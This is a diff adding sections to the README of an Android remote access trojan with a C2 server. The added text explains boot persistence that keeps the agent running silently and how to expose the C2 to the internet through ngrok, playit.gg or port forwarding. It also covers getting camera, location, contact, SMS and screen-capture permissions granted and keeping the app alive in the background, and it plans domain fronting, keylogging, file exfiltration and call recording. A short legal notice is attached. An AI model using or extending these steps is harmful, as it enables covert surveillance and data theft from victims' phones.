@@ -166,11 +166,142 @@ cd client\gradle\wrapper
 Invoke-WebRequest -Uri "https://github.com/gradle/gradle/raw/v8.7.0/gradle/wrapper/gradle-wrapper.jar" -OutFile gradle-wrapper.jar
 ```
 
+## Persistence
+
+The agent includes boot persistence — it auto-starts when the device reboots.
+
+**How it works:**
+- `StartReceiver` listens for `BOOT_COMPLETED` intent
+- Launches `SyncService` as a foreground service
+- Service reconnects to C2 with exponential backoff
+
+**First run requirement:** User must open the app once after install to:
+1. Grant runtime permissions (camera, contacts, SMS, etc.)
+2. Disable battery optimization (keeps service alive)
+3. Enable accessibility service (optional, for screen capture)
+
+After initial setup, the agent survives reboots and runs silently.
+
+---
+
+## WAN Access (ngrok / playit.gg)
+
+For testing over the internet (device not on USB):
+
+### Option 1: ngrok
+
+```bash
+# Install ngrok and auth
+ngrok authtoken <YOUR_TOKEN>
+
+# Expose C2 port
+ngrok tcp 8667
+```
+
+Note the forwarding address (e.g., `0.tcp.ngrok.io:12345`), then build with that:
+
+```bash
+python build.py --ip 0.tcp.ngrok.io --port 12345 --install
+```
+
+### Option 2: playit.gg (free, no account required)
+
+```bash
+python wan.py --setup-playit  # first time only
+python wan.py                 # starts tunnel + C2
+```
+
+### Option 3: Port forwarding
+
+If you control your router:
+1. Forward external port 8667 → your PC's LAN IP:8667
+2. Build with your public IP: `python build.py --ip <PUBLIC_IP>`
+3. Ensure firewall allows inbound on 8667
+
+---
+
+## Troubleshooting
+
+### "There is not enough space on the disk"
+
+Gradle caches to `C:\Users\<user>\.gradle` by default. If C: is low on space:
+
+```powershell
+$env:GRADLE_USER_HOME = "E:\gradle_home"  # or another drive with space
+python build.py --ip <IP> --install
+```
+
+### "Could not find or load main class org.gradle.wrapper.GradleWrapperMain"
+
+The gradle-wrapper.jar is missing. Run:
+
+```bash
+python setup.py
+```
+
+If that doesn't fix it:
+
+```powershell
+cd client\gradle\wrapper
+Invoke-WebRequest -Uri "https://github.com/gradle/gradle/raw/v8.7.0/gradle/wrapper/gradle-wrapper.jar" -OutFile gradle-wrapper.jar
+```
+
+### Agent not connecting
+
+1. **Check ADB tunnel:** `adb reverse --list` should show `tcp:8667 tcp:8667`
+2. **Re-establish tunnel:** `adb reverse tcp:8667 tcp:8667`
+3. **Check app is running:** `adb shell ps -A | grep ratv1`
+4. **Force restart app:** `adb shell am force-stop com.remote.ratv1 && adb shell am start -n com.remote.ratv1/.MainActivity`
+5. **Check C2 is listening:** `netstat -ano | findstr 8667` should show LISTENING
+
+### Permission denied errors
+
+The agent needs runtime permissions granted by the user:
+
+| Operation | Required Permission |
+|-----------|---------------------|
+| Camera | `android.permission.CAMERA` |
+| GPS | `android.permission.ACCESS_FINE_LOCATION` |
+| Contacts | `android.permission.READ_CONTACTS` |
+| SMS | `android.permission.READ_SMS` |
+| Screenshot | MediaProjection (system popup) |
+
+Grant via: Settings → Apps → [App Name] → Permissions
+
+### App killed in background
+
+Samsung/Xiaomi/Huawei aggressively kill background apps. Fixes:
+1. Disable battery optimization for the app
+2. Lock the app in recent apps (swipe down on the card)
+3. On Samsung: Settings → Battery → App Power Management → add to "Never sleeping"
+
+---
+
+## Future Development
+
+- [ ] **TCP/UDP toggle** — UDP for lower latency, TCP for reliability
+- [ ] **Domain fronting** — C2 over CDN (Cloudflare, AWS)
+- [ ] **Payload encryption** — AES for wire traffic
+- [ ] **Multi-agent management** — Web dashboard improvements
+- [ ] **File exfiltration** — Download files from device
+- [ ] **Keylogger** — Accessibility-based input capture
+- [ ] **Call recording** — Record incoming/outgoing calls
+- [ ] **Geofencing** — Trigger actions based on location
+
+---
+
 ## Legal Notice
 
 **For authorized security research and penetration testing only.**
 
 Use only on devices you own or have explicit written permission to test.
+
+Unauthorized access to computer systems is illegal under:
+- Computer Fraud and Abuse Act (US)
+- Computer Misuse Act (UK)
+- Criminal Code Act 1995 (Australia)
+
+The authors assume no liability for misuse.
 
 ## License
 
